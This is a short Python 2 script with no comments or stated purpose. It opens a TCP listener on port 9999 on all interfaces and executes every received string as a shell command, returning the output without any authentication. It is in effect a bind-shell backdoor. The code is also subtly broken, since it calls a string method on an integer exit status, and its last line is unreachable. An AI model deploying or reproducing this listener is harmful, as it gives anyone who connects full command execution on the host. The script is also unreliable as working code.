#coding:utf-8
import socket
import commands

host = '127.0.0.1'
port = 9999

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('',port))
s.listen(1)

while 1:
    conn,addr=s.accept()
    print 'Connected by',addr
    while 1:
        data = conn.recv(1024)
        cmd_status,cmd_result = commands.getstatusoutput(data)
        if len(cmd_status.strip()) == 0:
            conn.sendall('Done.')
        else:
            conn.sendall(cmd_result)
conn.close()
